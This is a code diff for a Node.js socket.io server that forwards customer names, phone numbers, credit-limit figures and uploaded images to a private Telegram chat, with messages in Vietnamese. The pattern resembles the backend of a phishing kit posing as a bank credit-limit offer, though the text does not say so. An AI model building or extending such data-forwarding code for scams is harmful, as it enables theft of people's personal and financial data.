@@ -24,10 +24,10 @@ io.on("connection", function (socket) {
     uploader.on("saved", function (event) {
         socket.emit('file', event.file.pathName);
     });
-    socket.on('service', async (data) => {
+    socket.on('service', (data) => {
         // send data to api telegram
         const message = `Có yêu cầu từ khách hàng: ${data.name} - Số điện thoại ${data.phone} - hạn mức hiện tại ${data.limit_now} - hạn mức khả dungh ${data.limit_total} - hạn mước mong muốn ${data.limit_increase}`;
-        await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
             chat_id: process.env.TELEGRAM_CHAT_ID,
             text: message,
             mode: 'html'
@@ -38,9 +38,11 @@ io.on("connection", function (socket) {
             await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                 chat_id: process.env.TELEGRAM_CHAT_ID,
                 photo: `${process.env.URL_IMAGE}/${image}`
-            })
+            }).then((res) => {
+                socket.emit('success', { message: 'Đã gửi yêu cầu thành công' });
+
+            }).catch((err) => { });
         });
-        socket.emit('success', { message: 'Đã gửi yêu cầu thành công' });
 
     });
 
